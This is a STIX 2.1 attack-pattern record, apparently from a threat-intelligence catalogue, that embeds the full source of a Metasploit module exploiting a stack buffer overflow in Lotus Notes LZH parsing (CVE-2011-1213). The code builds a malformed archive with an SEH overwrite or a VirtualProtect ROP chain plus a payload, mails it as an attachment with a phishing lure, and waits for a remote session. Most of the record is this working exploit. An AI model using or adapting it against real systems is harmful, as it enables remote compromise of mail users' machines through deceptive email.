{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--71d89402-77c6-469e-ac21-832910eac361",
    "created": "2024-08-14T16:47:54.09962Z",
    "modified": "2024-08-14T16:47:54.099624Z",
    "name": "Lotus Notes 8.0.x - 8.5.2 FP2 - Autonomy Keyview (.lzh Attachment)",
    "description": " This module exploits a stack buffer overflow in Lotus Notes 8.5.2 when parsing a malformed, specially crafted LZH file. This vulnerability was discovered binaryhouse.net   'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/lotus/lotusnotes_lzh.rb",
            "external_id": "lotusnotes_lzh.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-1213"
        },
        {
            "source_name": "reference",
            "url": "http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=904"
        },
        {
            "source_name": "reference",
            "url": "http://www.ibm.com/support/docview.wss?uid=swg21500034"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking # needs client interaction and permanent listener\n\n  #\n  # This module sends email messages via smtp\n  #\n  include Msf::Exploit::Remote::SMTPDeliver\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Lotus Notes 8.0.x - 8.5.2 FP2 - Autonomy Keyview (.lzh Attachment)',\n      'Description'    => %q{\n        This module exploits a stack buffer overflow in Lotus Notes 8.5.2 when\n        parsing a malformed, specially crafted LZH file. This vulnerability was\n        discovered binaryhouse.net\n\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'binaryhouse.net',              # original discovery\n          'alino <26alino[at]gmail.com>', # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2011-1213'],\n          ['OSVDB', '72706'],\n          ['BID', '48018'],\n          ['URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=904'],\n          ['URL', 'http://www.ibm.com/support/docview.wss?uid=swg21500034'],\n        ],\n      'Stance'         => Msf::Exploit::Stance::Passive,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Platform'       => ['win'],\n      'Targets'        =>\n        [\n          [ 'Lotus Notes 8.0.x - 8.5.2 FP2 / Windows Universal',\n            {\n              'Offset' => 6741,\n              'Ret'    => 0x780c26b2 # POP ECX; POP ECX; RETN MSVCP60.dll\n            }\n          ],\n\n          [ 'Lotus Notes 8.5.2 FP2 / Windows Universal / DEP',\n            {\n              'Offset' => 6745,\n              'Ret'    => 0x60dc1043 # ADD ESP,52C; XOR EAX,EAX; POP EDI; POP ESI; POP EBX; POP EBP; RETN 4 nnotes.dll\n            }\n          ],\n        ],\n      'DisclosureDate' => '2011-05-24',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        #\n        # Email options\n        #\n        OptString.new('FILENAME',\n          [false, 'Sets the attachment file name', 'data.lzh']),\n        OptString.new('MESSAGE',\n          [false, 'Email message text', 'Important message, please view attachment!'])\n      ])\n    register_advanced_options(\n      [\n        OptBool.new(\"ExitOnSession\", [ false, \"Return from the exploit after a session has been created\", true ]),\n        OptInt.new(\"ListenerTimeout\", [ false, \"The maximum number of seconds to wait for new sessions\", 0])\n      ])\n  end\n\n  def exploit\n\n    header =  \"\\x08\"\t\t# Size of archived file header <-- 8 - 13 = FFFFFFF6\n    header << \"\\x1a\"\t\t# 1 byte Header checksum\n    header << \"-lh0-\"\t\t# Method ID (No compression)\n    header << \"\\x7c\\x1a\\x00\\x00\"\t# Compressed file size\n    header << \"\\x7c\\x1a\\x00\\x00\"\t# Uncompressed file size\n    header << \"\\xB2\\x5e\\xab\\x3c\"\t# Original file date/time\n    header << \"\\x20\"\t\t# File attribute\n    header << \"\\x00\"\t\t# Level identifier\n    header << \"\\x07\"\t\t# File name length\n    header << \"poc.txt\"\t\t# File name\n    header << \"\\x25\\x7d\"\t\t# 16 bit CRC of the uncompressed file\n\n    lzh =  header\n    lzh << rand_text(target['Offset'])\n\n    if (target == targets[0])\n\n      lzh << generate_seh_record(target.ret)\n      lzh << make_nops(8)\n      lzh << payload.encoded\n\n    elsif (target == targets[1])\n\n      rop_nop = [0x7c3c5958].pack('V') * 47 # RETN MSVCP71.dll\n\n      rop_gadgets =\n      [\n        0x60524404, # POP EAX; RETN nnotes.dll\n        0x7c37a140, # VirtualProtect()\n        0x7c3a4000, # MOV EAX,DWORD PTR DS:[EAX]; RETN MSVCP71.dll\n        0x603c53c1, # MOV ESI,EAX; RETN nnotes.dll\n        0x60620001, # POP EBP; RETN nnotes.dll\n        0x7c3c5946, # PUSH ESP; RETN MSVCP71.dll\n        0x7c34280f, # POP EBX; RETN MSVCR71.dll\n        0x00001954, # dwSize\n        0x780ea001, # POP ECX; RETN MSVCP60.dll\n        0x7c38b000, # lpflOldProtect\n        0x60e73200, # POP EDI; RETN nnotes.dll\n        0x60e73201, # RETN nnotes.dll\n        0x601d5f02, # POP EDX; RETN nnotes.dll\n        0x00000040, # flNewProtect\n        0x60524404, # POP EAX; RETN nnotes.dll\n        0x90909090, # NOP\n        0x60820801, # PUSHAD; RETN nnotes.dll\n      ].pack(\"V*\")\n\n      lzh << [target.ret].pack('V')\n      lzh[32, rop_nop.length] = rop_nop\n      lzh[220, rop_gadgets.length] = rop_gadgets\n      lzh[289, payload.encoded.length] = payload.encoded\n    end\n\n    name = datastore['FILENAME'] || Rex::Text.rand_text_alpha(rand(10)+1) + \".lzh\"\n    data = datastore['MESSAGE'] || Rex::Text.rand_text_alpha(rand(32)+1)\n\n    msg = Rex::MIME::Message.new\n    msg.mime_defaults\n    msg.subject = datastore['SUBJECT'] || Rex::Text.rand_text_alpha(rand(32)+1)\n    msg.to = datastore['MAILTO']\n    msg.from = datastore['MAILFROM']\n\n    msg.add_part(Rex::Text.encode_base64(data, \"\\r\\n\"), \"text/plain\", \"base64\", \"inline\")\n    msg.add_part_attachment(lzh, name)\n\n    send_message(msg.to_s)\n\n    print_status(\"Waiting for a payload session (backgrounding)...\")\n\n    if not datastore['ExitOnSession'] and not job_id\n      fail_with(Failure::Unknown, \"Setting ExitOnSession to false requires running as a job (exploit -j)\")\n    end\n\n    stime = Time.now.to_f\n    print_status \"Starting the payload handler...\"\n    while(true)\n      break if session_created? and datastore['ExitOnSession']\n      break if ( datastore['ListenerTimeout'].to_i > 0 and (stime + datastore['ListenerTimeout'].to_i < Time.now.to_f) )\n\n      select(nil,nil,nil,1)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-05-24",
    "x_mitre_platforms": [
        "['win']"
    ]
}